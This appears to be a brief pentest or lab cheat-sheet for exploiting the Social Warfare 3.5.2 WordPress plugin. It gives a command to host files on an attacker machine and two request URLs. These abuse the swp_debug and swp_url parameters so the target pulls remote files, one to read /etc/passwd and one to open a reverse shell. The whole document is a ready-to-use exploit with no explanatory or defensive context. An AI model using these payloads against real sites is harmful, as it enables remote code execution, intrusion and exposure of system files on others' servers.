# Social-Warfare-3.5.2

- Start python server
sudo python3 -m http.server 80

- In browser - /etc/passwd
http://192.168.231.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.195:80/etc-passwd.txt

- In browser - Reverse Shell
http://192.168.231.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.195:80/shell.txt
